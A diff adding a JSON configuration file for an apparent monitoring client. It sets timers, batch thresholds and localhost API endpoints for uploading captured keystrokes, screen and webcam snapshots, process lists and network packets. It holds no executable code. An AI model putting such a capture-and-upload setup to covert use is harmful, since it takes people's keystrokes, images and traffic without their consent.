@@ -1,0 +1,87 @@
+﻿{
+  "UrisConfig": {
+    "BaseServiceUri": "http://localhost:64435/",
+    "RegisterUserUri": "/api/Account/Register",
+    "LoginUserUri": "/Token"
+  },
+  "ListenersConfigs": {
+    "KeyboardListenerConfig": {
+      "SendCapturedItemsThreshold": 20,
+      "SendCapturedItemsDestinationUri": "/api/CapturedKeys/PostCapturedKeys",
+      "RetrySleepDurationsInMilliseconds": [ 1000, 2000, 3000 ],
+      "SendCapturedItemsTimerConfig": {
+        "DueTime": 5000,
+        "Period": 2000
+      }
+    },
+    "DisplayListenerConfig": {
+      "SendCapturedItemsThreshold": 3,
+      "SendCapturedItemsDestinationUri": "/api/DisplaySnapshots/PostCapturedDisplaySnapshots",
+      "RetrySleepDurationsInMilliseconds": [ 1000, 2000, 3000 ],
+      "SendCapturedItemsTimerConfig": {
+        "DueTime": 5000,
+        "Period": 2000
+      }
+    },
+    "CameraListenerConfig": {
+      "SendCapturedItemsThreshold": 3,
+      "SendCapturedItemsDestinationUri": "/api/CameraSnapshots/PostCameraSnapshots",
+      "RetrySleepDurationsInMilliseconds": [ 1000, 2000, 3000 ],
+      "SendCapturedItemsTimerConfig": {
+        "DueTime": 5000,
+        "Period": 2000
+      }
+    },
+    "ActiveProcessesListenerConfig": {
+      "SendCapturedItemsThreshold": 1,
+      "SendCapturedItemsDestinationUri": "/api/ActiveProcesses/PostActiveProcesses",
+      "RetrySleepDurationsInMilliseconds": [ 1000, 2000, 3000 ],
+      "SendCapturedItemsTimerConfig": {
+        "DueTime": 5000,
+        "Period": 3000
+      }
+    },
+    "ForegroundProcessListenerConfig": {
+      "SendCapturedItemsThreshold": 5,
+      "SendCapturedItemsDestinationUri": "/api/ForegroundProcess/PostForegroundProcess",
+      "RetrySleepDurationsInMilliseconds": [ 1000, 2000, 3000 ],
+      "SendCapturedItemsTimerConfig": {
+        "DueTime": 5000,
+        "Period": 2000
+      }
+    },
+    "NetworkListenerConfig": {
+      "SendCapturedItemsThreshold": 50,
+      "SendCapturedItemsDestinationUri": "/api/NetworkPackets/PostNetworkPackets",
+      "RetrySleepDurationsInMilliseconds": [ 1000, 2000, 3000 ],
+      "SendCapturedItemsTimerConfig": {
+        "DueTime": 5000,
+        "Period": 2000
+      }
+    }
+  },
+  "OperatingSystemAPIsConfig": {
+    "KeyboardApiConfig": {
+      "SleepIntervalInMilliseconds": 15
+    },
+    "DisplayApiConfig": {
+      "DisplayWatcherSleepIntervalInMilliseconds": 1000
+    },
+    "CameraApiConfig": {
+      "SnapshotTimerConfig": {
+        "DueTime": 2000,
+        "Period": 2000
+      }
+    },
+    "ProcessApiConfig": {
+      "ActiveProcessesChangedTimerConfig": {
+        "DueTime": 2000,
+        "Period": 2000
+      },
+      "ForegroundProcessChangedTimerConfig": {
+        "DueTime": 2000,
+        "Period": 1000
+      }
+    }
+  }
+}
